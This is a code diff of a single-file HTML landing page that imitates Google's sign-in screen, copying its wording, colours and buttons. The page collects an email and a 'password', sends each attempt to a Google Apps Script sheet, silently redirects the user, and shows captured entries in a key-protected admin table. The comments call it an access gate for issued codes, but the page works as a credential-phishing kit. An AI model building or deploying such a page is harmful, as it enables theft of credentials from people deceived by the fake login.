@@ -1,18 +1,13 @@
 <!--
-Access Gate — quick landing page (corrected)
-- Collects email and a temp access code ("password") that YOU issue.
-- Logs each attempt locally and (optionally) to a Google Sheet via Apps Script.
-- Admin table in the same file (open with ?admin=1&key=YOUR_ADMIN_KEY).
+Access Gate — quick landing page (final, corrected)
+- Collects email + a temp access code you issue (rename "Password" if you want).
+- Logs locally and POSTs to Google Apps Script -> Google Sheet.
+- Admin table in same file: open with ?admin=1&key=YOUR_ADMIN_KEY
 
 Notes:
-- Navigation now happens in the SAME window (location.assign).
-- Fixed stray "};" bug and added readLocal().
-- Admin "remote" fetch is OFF by default to avoid CORS; toggle useRemote=true after adding a proxy/CORS headers.
-
-Setup:
-1) Update CONFIG below (DEST_LINK, ADMIN_KEY, BRAND_NAME, APPS_SCRIPT_URL).
-2) Host this single file (Vercel/Netlify/GitHub Pages).
-3) Admin: https://yourpage.com/?admin=1&key=YOUR_ADMIN_KEY
+- SAME-tab navigation (location.assign).
+- Fixed prior syntax error; added readLocal(); beacon delay so POST enqueues.
+- Admin remote fetch is OFF by default to avoid CORS (toggle useRemote=true after adding CORS/proxy).
 -->
 <!doctype html>
 <html lang="en">
@@ -22,28 +17,22 @@ Setup:
   <title>Access Gate</title>
   <style>
     :root{
-      --bg:#0f0f0f;
-      --card:#121212;
-      --muted:#c2c2c2;
-      --text:#eaeaea;
-      --accent:#7c3aed;
-      --blue:#8ab4f8;
-      --radius:12px;
+      --bg:#0f0f0f; --card:#121212; --muted:#c2c2c2; --text:#eaeaea;
+      --accent:#7c3aed; --blue:#8ab4f8; --radius:12px;
     }
     *{box-sizing:border-box}
     body{
       margin:0; font-family:Roboto, system-ui, -apple-system, Segoe UI, Inter, Arial;
-      background:var(--bg);
-      color:var(--text);
+      background:var(--bg); color:var(--text);
       min-height:100dvh; display:grid; place-items:center; padding:20px;
     }
-    .wrap{ width:min(360px, 100%); background:var(--card); border:1px solid #ffffff14; border-radius:var(--radius); box-shadow:0 8px 24px #00000080; overflow:hidden }
-    header{ padding:24px 24px 8px; }
+    .wrap{ width:min(360px,100%); background:var(--card); border:1px solid #ffffff14; border-radius:var(--radius); box-shadow:0 8px 24px #00000080; overflow:hidden }
+    header{ padding:24px 24px 8px }
     h1{ margin:0 0 8px; font-size:28px; font-weight:500 }
     .sub{ color:#9aa0a6; font-size:14px }
     main{ padding:0 24px 24px }
     label{ display:block; font-size:12px; color:#9aa0a6; margin:14px 0 6px }
-    input{ width:100%; background:#0b0b0b; border:1px solid #3c4043; color:var(--text); padding:14px; border-radius:4px; outline:none; }
+    input{ width:100%; background:#0b0b0b; border:1px solid #3c4043; color:var(--text); padding:14px; border-radius:4px; outline:none }
     input:focus{ border-color:#8ab4f8; box-shadow:0 0 0 3px #8ab4f833 }
     .link{ color:#8ab4f8; text-decoration:none; font-size:14px }
     .link:hover{ text-decoration:underline }
@@ -55,9 +44,9 @@ Setup:
     .msg{ margin-top:10px; font-size:13px }
     .ok{ color:#22c55e }
     .err{ color:#ef4444 }
-    footer{ padding:14px 24px; border-top:1px dashed #ffffff14; color:#9aa0a6; font-size:11px; }
+    footer{ padding:14px 24px; border-top:1px dashed #ffffff14; color:#9aa0a6; font-size:11px }
     table{ width:100%; border-collapse:collapse; margin-top:18px; font-size:13px }
-    th, td{ text-align:left; padding:10px 8px; border-bottom:1px solid #ffffff14; }
+    th,td{ text-align:left; padding:10px 8px; border-bottom:1px solid #ffffff14 }
     th{ color:#aab1d9; font-weight:600 }
     .pill{ font-size:11px; background:#ffffff12; padding:6px 10px; border-radius:999px }
     .toolbar{ display:flex; gap:10px; align-items:center; margin:6px 0 0 }
@@ -83,11 +72,12 @@ Setup:
 
         <div style="margin-top:8px"><a class="link" href="#" id="forgotEmail">Forgot email?</a></div>
 
-        <div class="note">Not your computer? Use a private browsing window to sign in. <a class="link" href="#" id="guestMode">Learn more about using Guest mode</a></div>
+        <div class="note">Not your computer? Use a private browsing window to sign in.
+          <a class="link" href="#" id="guestMode">Learn more about using Guest mode</a>
+        </div>
 
         <div class="actions">
           <button type="submit" class="btn" id="verifyBtn">Next</button>
-          <!-- Hidden "Open link" button retained as an alternate path -->
           <a id="openBtn" class="btn purple hidden" href="#">Open link</a>
           <button type="button" class="btn hidden" id="resetBtn" aria-hidden="true" tabindex="-1">Reset</button>
         </div>
@@ -95,7 +85,7 @@ Setup:
       </form>
     </main>
 
-    <!-- ADMIN VIEW (same file) -->
+    <!-- ADMIN VIEW -->
     <main id="adminView" class="hidden">
       <div class="toolbar">
         <span class="pill">Admin</span>
@@ -164,7 +154,7 @@ Setup:
     let mode = 'local';
     if(remote && CONFIG.APPS_SCRIPT_URL){
       try{
-        // Will require CORS headers/proxy to read
+        // Requires CORS headers/proxy to read remotely
         const res = await fetch(CONFIG.APPS_SCRIPT_URL, { method:'GET' });
         const json = await res.json();
         rows = (json && json.rows) ? json.rows : [];
@@ -179,8 +169,8 @@ Setup:
     const tbody = document.querySelector('#logTable tbody');
     tbody.innerHTML = '';
     rows.forEach((r, i) => {
-      const tr = document.createElement('tr');
       const ua = (r.userAgent||'').toString();
+      const tr = document.createElement('tr');
       tr.innerHTML = `<td>${i+1}</td><td class="mono">${r.timestamp}</td><td>${r.email}</td><td class="mono">${r.code}</td><td class="mono">${ua.slice(0,60)}…</td><td class="mono">${r.referrer||''}</td>`;
       tbody.appendChild(tr);
     });
@@ -208,3 +198,64 @@ Setup:
     const brandEl = $('#brand'); if (brandEl) brandEl.textContent = CONFIG.BRAND_NAME;
 
     const params = new URLSearchParams(location.search);
+    const isAdmin = params.get('admin') === '1';
+    const key = params.get('key') || '';
+    const useRemote = false; // set to true only after adding CORS/proxy to Apps Script
+    if (isAdmin && key === CONFIG.ADMIN_KEY) { showAdmin(useRemote); } else { showUser(); }
+
+    const form = $('#gateForm');
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const email = $('#email').value.trim();
+      const code  = $('#code').value.trim();
+      if(!email){ showMsg('Please enter an email.', true); return; }
+      if(!code){ showMsg('Please enter your password.', true); return; }
+
+      const record = { timestamp: nowIso(), email, code, userAgent: navigator.userAgent, referrer: document.referrer || '' };
+
+      // Save locally
+      try { storeLocal(record); } catch(e){}
+
+      // Send to Apps Script (beacon or fetch)
+      try {
+        if (navigator.sendBeacon) {
+          const blob = new Blob([JSON.stringify(record)], { type: 'text/plain' });
+          navigator.sendBeacon(CONFIG.APPS_SCRIPT_URL, blob);
+        } else {
+          logToServer(record);
+        }
+      } catch(e) {}
+
+      // Give beacon a moment to enqueue, then SAME-tab navigate
+      setTimeout(() => location.assign(CONFIG.DEST_LINK), 150);
+    });
+
+    const refreshBtn = $('#refreshBtn');
+    if (refreshBtn) refreshBtn.addEventListener('click', () => renderAdmin(false));
+
+    const exportBtn = $('#exportBtn');
+    if (exportBtn){
+      exportBtn.addEventListener('click', () => {
+        const csv = toCSV(readLocal());
+        const blob = new Blob([csv], {type:'text/csv'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url; a.download = 'access-gate-logs.csv'; a.click();
+        URL.revokeObjectURL(url);
+      });
+    }
+  }
+
+  document.addEventListener('DOMContentLoaded', init);
+  </script>
+
+  <!--
+  ================= OPTIONAL: Google Apps Script backend quick reference =================
+  - Paste the Code.gs below in a clean Apps Script project (no Libraries).
+  - Deploy as Web App: Execute as Me; Who has access: Anyone with the link.
+  - Use the /exec URL in CONFIG.APPS_SCRIPT_URL above.
+  =======================================================================
+  -->
+</body>
+</html>
+
